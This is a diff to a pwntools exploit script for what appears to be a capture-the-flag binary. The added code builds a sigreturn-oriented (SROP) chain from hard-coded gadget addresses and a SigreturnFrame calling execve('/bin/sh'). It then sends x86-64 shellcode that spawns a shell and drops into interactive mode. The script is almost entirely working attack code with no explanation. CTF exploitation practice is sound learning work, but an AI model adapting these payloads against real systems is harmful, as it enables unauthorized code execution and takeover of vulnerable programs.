@@ -1,7 +1,7 @@
 from pwn import *
 from icecream import ic
 
-elf = exe = ELF("./chall")
+exe = ELF("./main")
 
 context.binary = exe
 context.log_level = "debug"
@@ -24,7 +24,7 @@ def start(argv=[], *a, **kw):
 
 gdbscript = '''
 
-c
+
 '''.format(**locals())
 
 def sl(a): return io.sendline(a)
@@ -38,5 +38,34 @@ def i(): return io.interactive()
 
 io = start()
 
+pop_rax = 0x000000000040103f
+syscall = 0x000000000040102b
+binsh = 0x0000000000402000
 
+payload = b'a'*8
+payload += p64(pop_rax)
+payload += p64(15)
+payload += p64(syscall)
+
+frame = SigreturnFrame()
+frame.rax = 59
+frame.rdi = binsh
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall
+
+payload += bytes(frame)
+# sl(payload)
+
+payload = b'a'*8
+payload += asm('''
+mov rax, 59
+lea rdi, [rip+binsh]
+mov rsi, 0
+mov rdx, 0
+syscall
+binsh:
+    .string "/bin/sh"
+''')
+sl(payload)
 i()
